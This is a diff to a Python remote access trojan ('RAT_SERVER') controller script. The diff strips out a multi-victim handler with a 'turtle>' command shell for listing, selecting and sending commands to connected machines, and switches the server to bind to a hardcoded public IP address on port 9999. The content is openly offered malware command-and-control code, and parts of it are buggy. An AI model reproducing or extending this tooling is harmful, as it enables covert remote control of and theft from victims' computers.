@@ -5,13 +5,6 @@ import threading
 import time
 from queue import Queue
 
-NUMBER_OF_THREADS = 2
-JOB_NUMBER = [1, 2]
-queue = Queue()
-all_connections = []
-all_address = []
-
-
 class RAT_SERVER:
     def __init__(self, host, port):
         self.host = host
@@ -26,132 +19,6 @@ class RAT_SERVER:
         client, addr = s.accept()
         ipcli = client.recv(2048).decode()
         print(f"[*] Connection established with {ipcli} 💣")
-
-    def accept_connections(self):
-        for connection in all_connections:
-            connection.close()
-
-        del all_connections[:]
-        del all_address[:]
-
-        while True:
-            try:
-                conn, address = s.accept()
-                s.setblocking(1)  # Prevent timeout
-
-                all_connections.append(conn)
-                all_address.append(address)
-
-                print(f'Connected to: {address[0]}')
-
-            except:
-                print('Something went wrong accepting connection')
-
-    def create_socket(self): # Connect two machines
-        try:
-            global host
-            global port
-            global s
-            host = self.host
-            port = self.port
-            s = socket.socket()
-
-        except socket.error as msg:
-            print("Socket creation error: " + str(msg))
-
-    def bind_socket(self):
-        try:
-            global host
-            global port
-            global s
-            print("Binding the Port: " + str(port))
-
-            s.bind((host, port))
-            s.listen(5)
-
-        except socket.error as msg:
-            print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
-            self.bind_socket(self)
-
-    def create_workers(self):
-        for _ in range(NUMBER_OF_THREADS):
-            t = threading.Thread(target=self.work)
-            t.daemon = True
-            t.start()
-
-    def work(self):
-        while True:
-            x = queue.get()
-            if x == 1:
-                self.create_socket()
-                self.bind_socket()
-                self.accept_connections()
-            if x == 2:
-                self.start_turtle()
-
-            queue.task_done()
-
-    def create_jobs(self):
-        for x in JOB_NUMBER:
-            queue.put(x)
-        queue.join()
-
-    def start_turtle(self):
-        while True:
-            cmd = input('turtle> ')
-            if cmd == 'list':
-                self.list_connections()
-            elif 'select' in cmd:
-                conn = self.get_target(cmd)
-                if conn is not None:
-                    self.send_target_commands(conn)
-            else:
-                print("Command not recognized")
-
-    def list_connections(self):
-        results = ''
-
-        for i, conn in enumerate(all_connections):
-            try:
-                conn.send(str.encode(' '))
-                conn.recv(20480)
-            except:
-                del all_connections[i]
-                del all_address[i]
-                continue
-
-            results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
-
-        print("----Clients----" + "\n" + results)
-
-    def get_target(cmd):
-        try:
-            target = cmd.replace('select ', '')  # target = id
-            target = int(target)
-            conn = all_connections[target]
-            print("You are now connected to :" + str(all_address[target][0]))
-            print(str(all_address[target][0]) + ">", end="")
-            return conn
-            # 192.168.0.4> dir
-
-        except:
-            print("Selection not valid")
-            return None
-
-    def send_target_commands(conn):
-        while True:
-            try:
-                cmd = input()
-                if cmd == 'quit':
-                    break
-                if len(str.encode(cmd)) > 0:
-                    rat.execute()
-                #     conn.send(str.encode(cmd))
-                #     client_response = str(conn.recv(20480), "utf-8")
-                #     print(client_response, end="")
-            except:
-                print("Error sending commands --  err: send_target_commands")
-                break
 
     def server(self):
         try:
@@ -613,12 +480,12 @@ readfile <file>           read from file
                 rat.execute()
 
 
-rat = RAT_SERVER('50.116.8.102', int(input('Please enter a port to bind: ')))
+rat = RAT_SERVER('50.116.8.102', 9999)
 
 # 50.116.8.102
 
 if __name__ == '__main__':
-    # rat.build_connection()
-    # rat.execute()
-    rat.create_workers()
-    rat.create_jobs()
+    rat.build_connection()
+    rat.execute()
+    # rat.create_workers()
+    # rat.create_jobs()
